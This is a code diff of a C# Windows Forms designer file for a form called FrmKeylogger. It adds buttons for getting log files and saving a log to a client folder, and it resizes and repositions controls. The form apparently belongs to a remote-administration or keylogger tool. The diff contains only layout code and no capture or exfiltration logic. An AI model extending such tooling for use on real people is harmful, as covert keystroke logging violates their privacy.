@@ -37,6 +37,8 @@
             rtbLogViewer = new System.Windows.Forms.RichTextBox();
             button1 = new System.Windows.Forms.Button();
             checkBox1 = new System.Windows.Forms.CheckBox();
+            button2 = new System.Windows.Forms.Button();
+            button3 = new System.Windows.Forms.Button();
             statusStrip.SuspendLayout();
             SuspendLayout();
             // 
@@ -46,10 +48,9 @@
             lstLogs.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] { hLogs });
             lstLogs.Font = new System.Drawing.Font("Segoe UI", 8.25F);
             lstLogs.FullRowSelect = true;
-            lstLogs.GridLines = true;
             lstLogs.Location = new System.Drawing.Point(0, 31);
             lstLogs.Name = "lstLogs";
-            lstLogs.Size = new System.Drawing.Size(155, 431);
+            lstLogs.Size = new System.Drawing.Size(144, 431);
             lstLogs.TabIndex = 0;
             lstLogs.UseCompatibleStateImageBehavior = false;
             lstLogs.View = System.Windows.Forms.View.Details;
@@ -80,24 +81,25 @@
             // 
             btnGetLogs.Location = new System.Drawing.Point(2, 5);
             btnGetLogs.Name = "btnGetLogs";
-            btnGetLogs.Size = new System.Drawing.Size(153, 23);
+            btnGetLogs.Size = new System.Drawing.Size(142, 23);
             btnGetLogs.TabIndex = 9;
             btnGetLogs.Text = "Get Log Files";
+            btnGetLogs.Click += btnGetLogs_Click;
             // 
             // rtbLogViewer
             // 
             rtbLogViewer.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
             rtbLogViewer.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
-            rtbLogViewer.Location = new System.Drawing.Point(161, 32);
+            rtbLogViewer.Location = new System.Drawing.Point(150, 32);
             rtbLogViewer.Name = "rtbLogViewer";
             rtbLogViewer.ReadOnly = true;
-            rtbLogViewer.Size = new System.Drawing.Size(701, 427);
+            rtbLogViewer.Size = new System.Drawing.Size(712, 427);
             rtbLogViewer.TabIndex = 8;
             rtbLogViewer.Text = "";
             // 
             // button1
             // 
-            button1.Location = new System.Drawing.Point(161, 5);
+            button1.Location = new System.Drawing.Point(430, 5);
             button1.Name = "button1";
             button1.Size = new System.Drawing.Size(58, 23);
             button1.TabIndex = 1;
@@ -108,18 +110,38 @@
             // 
             checkBox1.Checked = true;
             checkBox1.CheckState = System.Windows.Forms.CheckState.Checked;
-            checkBox1.Location = new System.Drawing.Point(225, 5);
+            checkBox1.Location = new System.Drawing.Point(150, 4);
             checkBox1.Name = "checkBox1";
             checkBox1.Size = new System.Drawing.Size(104, 24);
             checkBox1.TabIndex = 0;
             checkBox1.Text = "Live Keylogger";
             checkBox1.CheckedChanged += checkBox1_CheckedChanged_1;
             // 
+            // button2
+            // 
+            button2.Location = new System.Drawing.Point(262, 5);
+            button2.Name = "button2";
+            button2.Size = new System.Drawing.Size(162, 23);
+            button2.TabIndex = 10;
+            button2.Text = "Save Log To Client Folder";
+            button2.Click += button2_Click;
+            // 
+            // button3
+            // 
+            button3.Image = Properties.Resources.maximizewindowicon;
+            button3.Location = new System.Drawing.Point(818, 6);
+            button3.Name = "button3";
+            button3.Size = new System.Drawing.Size(24, 23);
+            button3.TabIndex = 11;
+            button3.Click += button3_Click;
+            // 
             // FrmKeylogger
             // 
             AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
             AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
             ClientSize = new System.Drawing.Size(862, 482);
+            Controls.Add(button3);
+            Controls.Add(button2);
             Controls.Add(checkBox1);
             Controls.Add(button1);
             Controls.Add(rtbLogViewer);
@@ -150,5 +172,7 @@
         private System.Windows.Forms.ToolStripStatusLabel stripLblStatus;
         private System.Windows.Forms.Button button1;
         private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
     }
 }
